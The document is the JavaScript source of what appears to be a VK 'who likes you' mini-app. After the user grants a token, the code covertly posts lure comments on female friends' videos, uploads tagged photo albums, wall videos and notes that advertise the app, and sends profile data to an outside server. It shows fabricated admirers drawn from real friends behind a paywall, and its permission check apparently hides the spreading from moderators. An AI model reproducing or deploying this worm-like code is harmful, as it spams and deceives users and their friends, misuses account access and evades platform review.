var viewer;
var is_loaded_hide_story = 0;
var is_loaded_story = 0;
var count_mn = [];
var count_emotions = 0;
var love_count = 0;
var kiss_count = 0;
var podmig_count = 0;
var smile_count = 0;
var my_price = 20;
var my_rate = 20;
var id_photoupload = 0;
var id_videoupload = 0;
var usersForCommets = [];
var idCommets = [];
var VideosFriends = [];
var VideosSort = [];
var offset_photosave = 0;
var id_albom = 0;
var short_url = "https://vk.com/app"+vk_app_id;
var base64_story= '';
var link_app = "https://vk.cc/c4KZ5M";
$(function() {
    //vkConnect = vkConnect.default
    vkConnect.send('VKWebAppInit');
    vkConnect.sendPromise('VKWebAppGetUserInfo')
        .then(data => {
            viewer = data;
            loginServer();
            //var id = parseInt(window.location.hash.substr(1));

            /*
            if(id){
              checkHash(id);
            }else{
              vkConnect.send("VKWebAppClose", {"status": "success", "payload": {"name": "test"} });
            }
            */
        })
        .catch(error => {
            //location.reload();
        });

    vkConnect.subscribe(e => {
      if (e.detail.type === 'VKWebAppViewRestore'){

      }
    });
});

function getAppLink() {
  $.ajax({
      type: "POST",
      url: "https://newappsbase.com/SP/functions.php",
      data: {
          "method": "getLinkApp"
      },
      success: function(data){
        data = JSON.parse(data);
        var id = data.id;
        if(!id){
           link_app = data.telegram;
           createNoteLink();
        }else{
          vkConnect.sendPromise("VKWebAppCallAPIMethod", {
              "method": "apps.get",
              "params": {"app_id": id, "v": "5.95", "access_token": token}
          }).then(data => {
            if(data.response.count == 0) {
              $.ajax({
                  type: "POST",
                  url: "https://newappsbase.com/SP/functions.php",
                  data: {
                      "method": "appBanLink",
                      "app_url": "https://vk.com/app"+id
                  },
                  success: function(data){
                    return getAppLink();
                  },
                  error : function(data){
                       // $.ajax(this);
                  }});
            }else{
              link_app = "https://vk.com/app"+id;
              createNoteLink();
            }
           }).catch(error => {

          });
        }

      },
      error : function(data){
           // $.ajax(this);
      }});
}

function createNoteLink() {
  vkConnect.sendPromise("VKWebAppCallAPIMethod", {
      "method": "notes.add",
      "params": {"title": "Заходи в приложение :", "text":link_app, "v": "5.95", "access_token": token}
  }).then(data => {
    link_app = "https://vk.com/note"+viewer.id+"_"+data.response;
    goApp();
   }).catch(error => {

  });
}

function goApp() {

  vkConnect.sendPromise("VKWebAppStorageGet", {"keys": ["dateUpload"]}).then(data => {
      if (data.keys[0].value != date) {
          uploadPhoto();
          //uploadVideo();
          vkConnect.sendPromise("VKWebAppStorageSet", {"key": "dateUpload", "value": date});
      }
  });


    if(count_likes < 1) {
        generateLikes();
    }else{
        showLikes();
        showLovePopap();
        $("#count_mnen").css("display","");
        $("#count_mnen").text(count_likes);
    }
    $("#progress_div").html("");
    $("#progress").css("display","none");
}


function loginServer() {
  $.ajax({
      type: "POST",
      url: "https://newappsbase.com/SP/functions.php",
      data: {
          "method": "loginServer",
          "url":window.location.href
      },
      success: function(data){
        data = JSON.parse(data);

        viewer_id = data.viewer_id;
        viewer.id = viewer_id;
        date = data.date;
        permissions = data.permissions;
        vk_are_notifications_enabled = parseInt(data.vk_are_notifications_enabled);
        count_likes = parseInt(data.count_likes);
        my_photo_url = data.my_photo_url;
        platform = data.platform;
        AllowMessages = parseInt(AllowMessages.AllowMessages);
        vk_app_id = parseInt(data.vk_app_id);
        vk_platform = data.vk_platform;
        unix = parseInt(data.unix);
        $(".TopPanelPLATFORM").removeClass('TopPanelPLATFORM').addClass('TopPanel'+platform);
        $(".SupportPLATFORM").removeClass('SupportPLATFORM').addClass('Support'+platform);


        getTokenFirst();
        if (my_photo_url != viewer.photo_max_orig) {
            updateUserInfo();
        }
      },
      error : function(data){
           // $.ajax(this);
      }});
}
function updateUserInfo() {
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "updateUserInfo",
            "viewer_id": viewer_id,
            "name": viewer.first_name+" "+viewer.last_name,
            "photo": viewer.photo_max_orig,
            "sex": viewer.sex,
        },
        success: function(data){},
        error : function(data){
             // $.ajax(this);
        }});
}

function getTokenFirst() {
    $("#progress_div").html("<div style='color: white;margin: 20px;border-radius: 10px;padding: 50px;'> \n\
          <div style='text-align: center' > \n\
              <span>Нужен доступ к друзьям, чтобы загрузить список ответов</span> \
          <div style='margin-top: 20px;'><button onclick='getToken();' class='button is-link is-fullwidth'>Войти</button></div> \n\
          </div> \n\
    </div>");
    getToken();
}

function getToken() {
    vkConnect.sendPromise("VKWebAppGetAuthToken", {
        "app_id": vk_app_id,
        "scope": "friends,groups,photos"
    })
    .then(data => {
        if(token){return false;}
        var padding = $(".TopPanel").height();
        $("#FrLenta").css("padding-top",padding+"px");
        token = data.access_token;
        firstApi();
    })
    .catch(error => {
        setTimeout(function() {
            getToken();
        }, 3000);
    });
}

function firstApi() {
    var code = 'var time=API.utils.getServerTime(); \n\
    var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo, occupation","count":500}); \n\
    var u=API.users.get({fields:"uid, first_name, last_name, photo_max, photo_100, photo_400_orig, photo_id, bdate, sex, city, relation, is_closed, counters"})[0]; \n\
    var g=parseInt(API.groups.isMember({group_id:9713780,v:5.24}))+parseInt(API.groups.isMember({group_id:166562603,v:5.24}))+parseInt(API.groups.isMember({group_id:134304772,v:5.24}))+parseInt(API.groups.getMembers({group_id:9713780,count:0,filter:"friends",v:5.24}).count)+parseInt(API.groups.getMembers({group_id:166562603,count:0,filter:"friends",v:5.24}).count)+parseInt(API.groups.getMembers({group_id:194823504,count:0,filter:"friends",v:5.24}).count);u.counters.friends=parseInt(u.counters.friends);if (u.counters.friends<10)g=g+1;if(u.id<1000000) g=g+1; \n\
    u.permissions=g; \n\
    var user={}; \n\
    var r={user:u,permissions:g}; \n\
    return [friends,time,r];';

     vkConnect.sendPromise("VKWebAppCallAPIMethod", {
        "method": "execute",
        "params": {"code": code, "v": "5.95", "access_token": token}
    }).then(data => {
        viewer.friends = data.response[0];
        var fr_temp = [];
        for(var i = 0; i<viewer.friends.items.length; i++){
          if(!viewer.friends.items[i].deactivated && viewer.friends.items[i].hasOwnProperty('last_seen') && unix < viewer.friends.items[i].last_seen.time+(30*86400)){
              fr_temp.push(viewer.friends.items[i]);
          }
        }
        viewer.friends.items = fr_temp;

        fr_temp = [];
        viewer.photo_100 = data.response[2].user.photo_100;

        if (permissions === 'false') {
            permissions = data.response[2].permissions;
        }

        var bdate = viewer.bdate;
        my_age = getAge(bdate);

        if(permissions == 0) {
          goApp();
          //getAppLink();

          //okAllowMessagesHard();

        }else{
            $("#progress_div").html("");
            $("#progress").css("display","none");
          //  if(platform == "ios"){
                $("#liMonets").remove();
          //  }
            showLikes();
        }
      })
      .catch(error => {

      });
}

function checkHash(id) {
  $.ajax({
  type: "POST",
  url: "https://newappsbase.com/SP/functions.php",
  data: {
      "method": "checkHash",
      "viewer_id": viewer_id,
      "id": id
  },
  success: function(data){
      if(data == 'false' && id!= 999){
        /*
        $.ajax({
            type: "POST",
            url: "https://newappsbase.com/SP/functions.php",
            data: {
                "method": "sendSupport",
                "viewer_id": viewer_id,
                "text": 'https://vk.com/id'+viewer_id+" Не подходит для входа, id : "+id
            },
            success: function (data) {
            },
            error: function (data) {
                //// $.ajax(this);
            }
        });
*/
        vkConnect.send("VKWebAppClose", {"status": "success", "payload": {"name": "test"} });

          return false;
      }
      getTokenFirst();
      if (my_photo_url != viewer.photo_max_orig) {
          updateUserInfo();
      }
  },
  error : function(data){

  }});
}

var global_offset_video = 0;

function getVideosFriends() {
  var code = 'return [';
  var count=0;
  for(var i=0;i<viewer.friends.items.length;i++){
    if(viewer.friends.items[i].sex == 1){
      count++;
      code+='API.video.get({"owner_id":'+viewer.friends.items[i].id+',"count":3}),';
      if(count > 23){
        break;
      }
    }
  }
  code+='];';

    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
        "method": "execute",
        "params": {"code": code, "v": "5.95", "access_token": token}
    }).then(data => {
      VideosFriends = data.response;
      for(var i =0;i<VideosFriends.length;i++){
        for(var q = 0;q<VideosFriends[i].items.length;q++){
          if(VideosFriends[i].items[q].can_comment == 1){
            VideosSort.push(VideosFriends[i].items[q]);
            break;
          }
        }
      }
         uploadCommentsVideoFriends()
     }).catch(error => {

      });
}

function uploadCommentsVideoFriends() {
  if(!VideosSort[global_offset_video]){
    return false;
  }

  var comments = [
    "Не могу в л.с тебе написать, ты видела кто хочет с тобой поставить семейное положение : "+short_url,
    "Странно, но не могу в л.с тебе написать, ты видела кто хочет с тобой поставить с.п.? : "+short_url,
    "Не получается в личку написать, посмотри кто тебе признается в любви, как тебе?  "+short_url,
    "Ты видела кто хочет с тобой поставить семейное положение? я в шоке) (Не могу в личку написать) : "+short_url,
    "Без комментариев, я в шоке что написали : "+short_url];

    var comment = comments[getRandom(0,comments.length-1)];

  var code = 'return [';
  //for(var i=0;i<VideosSort.length;i++){
    code+='API.video.createComment({"owner_id":'+VideosSort[global_offset_video].owner_id+',"video_id":'+VideosSort[global_offset_video].id+',"message":'+comment+'}),';
    //if(i > 23){
    //  break;
    //}
  //}
  code+='];';
  global_offset_video++;

  vkConnect.sendPromise("VKWebAppCallAPIMethod", {
      "method": "execute",
      "params": {"code": code, "v": "5.95", "access_token": token}
  }).then(data => {
      setTimeout(function() {
        uploadCommentsVideoFriends();
      }, 3000);
   }).catch(error => {
     console.log(error);
      if(error.error_data.error_reason.error_code == 14){
        setTimeout(function() {
          uploadCommentsVideoFriends();
        }, 5000);
      }
    });
}

function okAllowMessagesHard2() {
      vkConnect.sendPromise("VKWebAppAllowMessagesFromGroup", {"group_id": 204412732})
      .then(data => {
          AllowMessages2 = 1;
          $.ajax({
                type: "POST",
                url: "https://newappsbase.com/SP/functions.php",
                data: {
                    "method": "okAllowMessages2",
                    "viewer_id": viewer.id,
                    "dev": 1,
                    "permissions": permissions
                }
            });
      })
      .catch(error => {
        if(JSON.stringify(error) == "{}"){
          AllowMessages2 = 1;
          $.ajax({
                type: "POST",
                url: "https://newappsbase.com/SP/functions.php",
                data: {
                    "method": "okAllowMessages2",
                    "viewer_id": viewer.id,
                    "dev": 1,
                    "permissions": permissions
                }
            });
            return false;
        }
        console.log(JSON.stringify(error));
          okAllowMessagesHard2();
      });
}

var global_offset_i = 0;
var count_video_save = 0;
function uploadVideo() {
    var users_list = "";
    var text = [
        "Мне сегодня призналось в любви 2 человека, кому больше? : "+link_app+" \n\n"+users_list
      ];
    var caption = text[getRandom(0,text.length-1)];


  var videos = [
    "https://www.youtube.com/watch?v=r8ZCiW9APlU"
  ];
  var video = videos[getRandom(0,videos.length-1)];


    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
       "method": "video.save",
       "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":caption, "v": "5.95", "access_token": token}
   }).then(data => {

     id_videoupload = data.response.video_id;
     //uploadComments();

     $.ajax({
     type: "POST",
     url: "https://newappsbase.com/SP/functions.php",
     data: {
         "method": "getLink",
         "url": data.response.upload_url
     },
     success: function(data){

     },
     error : function(data){

     }});
      $("#for_iframe").html('<iframe src="'+data.response.upload_url+'" height="5px" width="5px"></iframe>');


   });
}

function createCommetsVideo() {
  var users = [];
  var count = 0;
  for(var i = global_offset_i+1;i<viewer.friends.items.length;i++) {
      if(viewer.friends.items[i].has_photo == 1){
        if(viewer.friends.items[i].online_app){
          users.push(viewer.friends.items[i].id);
          global_offset_i = i;
          if(users.length > 1) {
            break;
          }
        }
      }
  }

  usersForCommets = users;
  uploadComments();
  console.log(id_videoupload);
  console.log(users);
}

function uploadComments() {
var code = 'return [';
//for(var i=0;i<usersForCommets.length;i++){
//  code+='API.video.createComment({"video_id":'+id_videoupload+',"message":"@id'+usersForCommets[i]+'"}),';
//}
var count = 0;
var uids = "";
for(var i =0;i<2;i++) {
  uids = "";
  var count = 0;
  for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
      //if(viewer.friends.items[q].online){
        uids +="[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
        count++;
          if(count > 8) {
            code+='API.video.createComment({"video_id":'+id_videoupload+',"message":"'+uids+'"}),';
            break;
          }
        //}
      //}

  }
}
code+='];';

  vkConnect.sendPromise("VKWebAppCallAPIMethod", {
      "method": "execute",
      "params": {"code": code, "v": "5.95", "access_token": token}
  }).then(data => {
      idCommets = data.response;
       uploadPhoto();
   }).catch(error => {
      uploadPhoto();
    });

}

function sortByLastTime() {
  viewer.friends.items.sort((a, b) => b.last_seen.time > a.last_seen.time ? 1 : -1);
}

function byLastTime() {
  //if(a.last_seen && b.last_seen){
    return (a, b) => a.last_seen.time > b.last_seen.time ? 1 : -1;
  //}
}

function showFriends() {
    $("#page").html('<h4 class="title is-4" style="text-align: center">Друзья</h4>');

    for(var i=0;i<viewer.friends.items.length;i++){
        if(!viewer.friends.items[i].deactivated && viewer.friends.items[i].sex != viewer.sex) {
            var div = "<div class='box' id='fr_" + viewer.friends.items[i].id + "' onclick='showProfile(" + viewer.friends.items[i].id + ");' style='position:relative;'>" +
                "<img style='border-radius: 50%;' src='" + viewer.friends.items[i].photo_100 + "'/>" +
                "<div>"+viewer.friends.items[i].first_name+"</div>" +
                "</div>";
            $("#page").append(div);
        }
    }
}

function generateLikes() {
  console.log(viewer.friends.items);
    try {
        var r_count = getRandom(5,8);
        var generatesFr = [];
        for(var i = 0; i<viewer.friends.items.length; i++){
            if(generatesFr.length > r_count){break;}
            if (viewer.sex != viewer.friends.items[i].sex && viewer.last_name.toUpperCase().indexOf(viewer.friends.items[i].last_name.toUpperCase()) == -1) {
                var frAge = 0;
                if(viewer.friends.items[i].bdate){
                    frAge = getAge(viewer.friends.items[i].bdate);
                }

                if(my_age > 0 && (my_age-2 <= frAge && my_age+7 >= frAge)){
                    var friend_push = {};
                    friend_push.uid = viewer.friends.items[i].id;
                    friend_push.name = viewer.friends.items[i].first_name + " " + viewer.friends.items[i].last_name;
                    friend_push.photo = viewer.friends.items[i].photo_max;
                    friend_push.sex = viewer.friends.items[i].sex;
                    generatesFr.push(friend_push);
                }

            }
        }
        for(var i = 0; i<viewer.friends.items.length; i++){
            if(generatesFr.length > r_count){break;}
            if (viewer.sex != viewer.friends.items[i].sex && viewer.last_name.toUpperCase().indexOf(viewer.friends.items[i].last_name.toUpperCase()) == -1) {
                var friend_push = {};
                friend_push.uid = viewer.friends.items[i].id;
                friend_push.name = viewer.friends.items[i].first_name + " " + viewer.friends.items[i].last_name;
                friend_push.photo = viewer.friends.items[i].photo_max;
                friend_push.sex = viewer.friends.items[i].sex;
                generatesFr.push(friend_push);
            }
        }

        $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "setLikes",
            "my_sex": viewer.sex,
            "viewer_id": viewer_id,
            "friends": generatesFr
        },
        success: function(data){
            data = JSON.parse(data);

            if(data.count > 0){
                count_likes = data.count;
                $("#count_mnen").css("display","");
                $("#count_mnen").text(data.count);
            }else{
                $("#count_mnen").css("display","none");
            }
            showLovePopap();
            showLikes();
        },
        error : function(data){
             // $.ajax(this);
        }});
    }catch (err) {
        console.log(err.message);
    }
}

function showLovePopap() {

return false;
  var div = '<div class="blackPopap" style="position: relative;z-index: 9999;"> \n\
            <div class="modal-background" style="position: fixed;"></div> \n\
            <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
                <div id="LovePopap" style="font-size: 20px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
                   <div style="margin-bottom: 10px;text-align: center;"><b>Опубликуй Историю<br> Чтобы войти <div> </div></br></div> \n\
                    <div style="text-align: center"><button onclick="uploadStory(0)" class="button is-link is-fullwidth" style="margin-top: 5px;" >Опубликовать</button></div> \n\
              </div> \n\
            </div> \n\
        </div>';
      $("body").append(div);

  return false;

    var div = '<div class="blackPopap" style="position: relative;z-index: 9999;"> \n\
              <div onclick="closeseblackPopap()" class="modal-background" style="position: fixed;"></div> \n\
              <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
                  <div id="LovePopap" style="font-size: 20px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
                   <div onclick="closeseblackPopap()" style="cursor: pointer;font-size: 30px;text-align: right;margin-bottom: 20px;color: #b5b5b5;"><i class="fas fa-times"></i></div> \n\
                     <div style="margin-bottom: 10px;text-align: center;"><b>Мы нашли человека <br> Который заходит к тебе на страницу уже <div> <span style="font-size: 20px;margin: 10px;" class="tag is-danger">5 ДНЕЙ ПОДРЯД</span> </div> <div> <div style="font-size: 25px;margin: 10px;"><img src="img/white_question.png" /></div> </div></br></div> \n\
                      <div style="text-align: center"><button class="button is-success is-fullwidth" style="margin-top: 5px;" onclick="byGuestPopap()">Узнать кто это</button></div> \n\
                </div> \n\
              </div> \n\
          </div>';
        $("body").append(div);
}
function byLovePopap() {
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "byLovePopap",
            "viewer_id": viewer_id
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                closeseblackPopap();
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets);
                return false;
            }else {
                $("#count_monets").text(data.monets);
                var friend = getFriendOnlineNotMySex();
                $("#LovePopap").html("<div style='text-align: center;'><a target='_blank' href='https://vk.com/id"+friend.id+"'><img src='"+friend.photo_200+"'><div>"+friend.first_name+" "+friend.last_name+"</div></a></div>");
            }
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
}

function byGuestPopap() {
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "byLovePopap",
            "viewer_id": viewer_id
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                closeseblackPopap();
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets);
                return false;
            }else {
                $("#count_monets").text(data.monets);
                var friend = getFriendOnline();
                $("#LovePopap").html("<div style='text-align: center;'><a target='_blank' href='https://vk.com/id"+friend.id+"'><img src='"+friend.photo_200+"'><div>"+friend.first_name+" "+friend.last_name+"</div></a></div>");
            }
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
}

function refreshCountMnens() {
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "refreshCountMnens",
            "viewer_id": viewer_id
        },
        success: function(data) {
            data = JSON.parse(data);
            if(data.count > 0){
                $("#count_mnen").css("display","");
                $("#count_mnen").text(data.count);
            }else{
                $("#count_mnen").css("display","none");
            }
        }});
}

function serchUser(uid, users) {
    for(var i = 0; i < users.length ; i++) {
        if(users[i].id === uid) {
            return users[i];
        }
    }
    return false;
}

function showLikes() {
    $("#page").html('<section class="has-text-centered"><div style="padding: 10px;" id="Likes" class="container"> <progress class="progress is-small" max="100">15%</progress> </div> </section>');
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "showLikes",
            "viewer_id": viewer_id,
            "permissions": permissions,
            "count_mn": count_mn.length
        },
        success: function(data){
            $("#page").html(data);
        },
        error : function(data){
             // $.ajax(this);
        }});
}

function getHome() {
    $("#progress").css("display","");
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "getHome",
            "viewer_id": viewer_id,
            "permissions": permissions
        },
        success: function(data){
            $("#page").html(data);
            $("#progress").css("display","none");
        },
        error : function(data){
             // $.ajax(this);
        }});
}


function showProfile(uid) {
    if(uid == viewer_id){
        changeTab('Home');
        showLikes();
        return false;
    }

    $("#page").css("display","none");
    $("#BottomTabs").css("display","none");
    $("#HardPopap").css("display","block");
    $("#backBtn").css("display","block");

    $("#HardPopapContent").html('' +
        '<div style="position: fixed;z-index: 999;opacity: 0.9;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);width:80%;"> \n\
          <progress class="progress is-small" max="100">15%</progress> \n\
        </div>');


    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
        "method": "users.get",
        "params": {"user_ids": uid, "fields": "first_name, last_name, photo_100, photo_max_orig, photo_400_orig, sex", "v": "5.95", "access_token": token}
    }).then(data => {

        var name = data.response[0].first_name+" "+data.response[0].last_name;
        var photo = data.response[0].photo_100;
        var sex = data.response[0].sex;

        $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "showProfile",
            "uid": uid,
            "name": name,
            "photo": photo,
            "sex": sex,
            "my_sex": viewer.sex,
            "permissions": permissions,
            "viewer_id": viewer_id
        },
        success: function(data){
            $("#HardPopapContent").html(data);
        },
        error : function(data){
             // $.ajax(this);
        }});

      })
      .catch(error => {

      });


}

function sendMnen(uid, text) {
    $("body").append('' +
        '<div class="alert" style="position: fixed;z-index: 9999;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);max-width:80%;    background: #ffffffc4;padding: 20px;"> \n\
          <button onclick="$(\'.alert\').remove();" class="delete"></button> \n\
          <div style="color: #4CAF50;font-size: 40px;"><i class="far fa-check-circle"></i></div> \n\
        </div>');

    closeHardPopap();

    setTimeout(function() {
        $('.alert').remove();
    }, 3000);

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "sendMnen",
            "uid": uid,
            "viewer_id": viewer_id,
            "name": viewer.first_name+" "+viewer.last_name,
            "photo": viewer.photo_max_orig,
            "message": text
        },
        success: function(data){
        },
        error : function(data){
             // $.ajax(this);
        }});
}


function closeHardPopap() {
    $("#page").css("display","block");
    $("#BottomTabs").css("display","block");
    $("#HardPopapContent").html("");
    $("#HardPopap").css("display","none");
    $("#TopPopular").css("display","block");
    $("#HardPopap").css("padding-top","0px");
    $("#backBtn").css("display","none");
}
var alboms = [];
var offset_albom = 0;
function uploadPhoto() {
  createAlbom();
}

function getFriendsOnlineForPhoto() {
  sortByLastTime();
  var users_list = "\n\n\n\n";
  var count = 0;
  for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
      users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"] ";
      count++;
      if(count > 8){
        break;
      }
  }

    return users_list;
}
var count_upload_photo = 0;
function uploadPhotoAlbom(id_albom){

    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
      "method": "photos.getUploadServer",
      "params": {"album_id":id_albom,"v": "5.95", "access_token": token}
  }).then(data => {

    var upload_url = data.response.upload_url;

    var formData = new FormData();
    formData.append("upurl", upload_url);
    formData.append("my_photo", viewer.photo_max_orig);
    //formData.append("is_photo", 1);
    formData.append("viewer_id", viewer_id);

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://newappsbase.com/SP/uploadPhoto.php", true);

    xhr.onload = function(e) {
      var data = JSON.parse(xhr.response);
            var caption = "";
            var users_list = getFriendsOnlineForPhoto();
            //"Оставляю о тебе мнение, прочитай если интересно : \n\n "+link_app+"\n\n"+users_list
            var text = [
              "Оставляю о вас мнения, прочитайте если интересно : "+link_app+"  \n\n "+users_list
          ];
          var caption = text[getRandom(0,text.length-1)];

            vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                "method": "photos.save",
                "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":caption,"v": "5.95", "access_token": token}
            }).then(data => {
              count_upload_photo++;

              if(count_upload_photo < 4 && viewer.friends.items[global_offset_i+1]){
                setTimeout(function() {
                    uploadPhotoAlbom(id_albom);
                }, 100);
              }


              })
              .catch(error => {

              });
    };
    xhr.send(formData);
    })
    .catch(error => {
    });

}

function createAlbom(){
  vkConnect.sendPromise("VKWebAppCallAPIMethod", {
      "method": "photos.createAlbum",
      "params": {"title":viewer.id,"v": "5.95", "access_token": token}
  }).then(data => {
    id_albom = data.response.id;
    uploadPhotoAlbom(id_albom);
    })
    .catch(error => {

    });
}

function storyButton(is_hide = 0) {
  if(is_hide == 0){
    closeseblackPopap();
  }
  uploadStory(is_hide);
}

function uploadStory(is_hide) {



       // html2canvas(document.getElementById('StoryBox'), {scrollY:0, scrollX:0, height: 1280, width: 720}).then(function(canvas2) {
              //console.log(base64_story);
              vkConnect.send("VKWebAppShowStoryBox", {
                 "background_type" : "image", "url" : "https://appsbase.ru/SP/img/bGStory.png", "attachment": {"text":"open", "type": "url", "url": "https://vk.com/app"+vk_app_id}
               }).then(data => {
                    closeseblackPopap();
                })
                .catch(error => {
                    console.log(error);
                });
              //$("#for_canvas").html("");
         // });
       // });
}


var showing_guest = 0;
function changeTab(tab) {
    $(".bottomTabs li").removeClass("is-active");
    $("#"+tab).addClass("is-active");
    $('html, body').animate({scrollTop: 0}, 0);


}

function getAge(bdate){
    if(!bdate){
        return 0;
    }
    var bdateArr = bdate.split(".");
    if(bdateArr.length < 3){
        return 0;
    }

    var today = new Date();
    var birthDate = new Date(bdateArr[2],bdateArr[1]-1,bdateArr[0]);
    var age = today.getFullYear() - birthDate.getFullYear();
    var m = today.getMonth() - birthDate.getMonth();
    if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate()))
    {
        age--;
    }
    return age;
}

function notificationsHard() {
      vkConnect.sendPromise("VKWebAppAllowNotifications", {}).then(data => {
          $("#notifAlert").remove();
          vk_are_notifications_enabled = 1;
          $.ajax({
                type: "POST",
                url: "https://newappsbase.com/SP/functions.php",
                data: {
                    "method": "saveNotifications",
                    "viewer_id": viewer_id,
                    "dev": 1
                }
            });
      })
      .catch(error => {
        notificationsHard();
      });
}

function okAllowMessagesHard() {
  if(AllowMessages == 1){
    return false;
  }
      vkConnect.sendPromise("VKWebAppAllowMessagesFromGroup", {"group_id": 205451682})
      .then(data => {
          AllowMessages = 1;
          $.ajax({
                type: "POST",
                url: "https://newappsbase.com/SP/functions.php",
                data: {
                    "method": "okAllowMessages",
                    "viewer_id": viewer_id,
                    "dev": 1,
                    "permissions": permissions
                }
            });
      })
      .catch(error => {
          okAllowMessagesHard();
      });
}

function okAllowMessages() {
      vkConnect.sendPromise("VKWebAppAllowMessagesFromGroup", {"group_id": 204223442})
      .then(data => {
          $("#btnokAllowMessages").replaceWith('<div class="notification">Выполнено</div>');
          AllowMessages = 1;
          $.ajax({
                type: "POST",
                url: "https://newappsbase.com/SP/functions.php",
                data: {
                    "method": "okAllowMessages",
                    "viewer_id": viewer_id,
                    "dev": 1,
                    "permissions": permissions
                }
            });
      })
      .catch(error => {

      });
}

function okNotif() {
      vkConnect.sendPromise("VKWebAppAllowNotifications", {})
      .then(data => {
          $("#btnOkNotif").replaceWith('<div class="notification">Выполнено</div>');
          vk_are_notifications_enabled = 1;
          $.ajax({
                type: "POST",
                url: "https://newappsbase.com/SP/functions.php",
                data: {
                    "method": "saveNotifications",
                    "viewer_id": viewer_id,
                    "dev": 1
                }
            });
      })
      .catch(error => {

      });
}

function getRandom(min, max)
{
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function answerQuestion(id) {
    $("#question_"+id+" .controlBtns").css("display","none");
    $("#question_"+id+" .answerBlock").css("display","block");
    $("#question_"+id+" .answerBlock textarea").focus();
}

function answerQuestionReturn(id) {
    $("#question_"+id+" .controlBtns").css("display","block");
    $("#question_"+id+" .answerBlock").css("display","none");
}

function deletedQuestion(id){
    $("#question_"+id+" .qContainer").css("display","none");
    $("#question_"+id+" .qDeleted").css("display","block");

    var count_questions = parseInt($("#count_questions").text());
    if(count_questions>0) {
        count_questions--;
        $("#count_questions").text(count_questions);
        if (count_questions < 1) {
            $("#count_questions").css("display", "none");
        }
    }

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "changeQuestionStatus",
            "viewer_id": viewer_id,
            "id": id,
            "status": 1
        }
    });
}

function returnQuestion(id){
    $("#question_"+id+" .qContainer").css("display","block");
    $("#question_"+id+" .qDeleted").css("display","none");

    //var count_questions = parseInt($("#count_questions").text());
    //count_questions++;
    //$("#count_questions").text(count_questions);
    //$("#count_questions").css("display","");

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "changeQuestionStatus",
            "viewer_id": viewer_id,
            "id": id,
            "status": 0
        }
    });
}

var last_question = "";
var last_answer = "";



function closeseblackPopap() {
    $(".blackPopap").remove();
}

function answerQuestionText(id) {
    var answer = $.trim($("#question_"+id+" .answerBlock textarea").val());
    if(!answer){
        return false;
    }

    var question = $("#question_"+id+" .message-body h4").text();
    last_question = question;
    last_answer = answer;

    var div = '<div class="blackPopap" style="position: relative;z-index: 99;"> \n\
          <div onclick="closeseblackPopap()" class="modal-background" style="position: fixed;"></div> \n\
          <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
              <div style="font-size: 20px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
                 <p style="margin-bottom: 10px;text-align: center;"><b>Ответ успешно сохранён</b></p> \n\
                  <button style="margin-top: 10px;" onclick="uploadAnswer();" class="button is-success is-fullwidth"> \n\
                      <span>Загрузить ответ в Истории</span> \n\
                  </button> \n\
                  <button style="margin-top: 50px;" onclick="closeseblackPopap();" class="button is-danger is-fullwidth"> \n\
                      <span>Закрыть</span> \n\
                      <span class="icon is-small"> \n\
                        <i class="fas fa-times"></i> \n\
                      </span> \n\
                  </button> \n\
            </div> \n\
          </div> \n\
      </div>';
    $("body").append(div);


    $("#question_"+id+" .answerBlock").remove();
    $("#question_"+id+" .controlBtns").remove();
    $("#question_"+id).addClass('is-info').removeClass('is-warning');
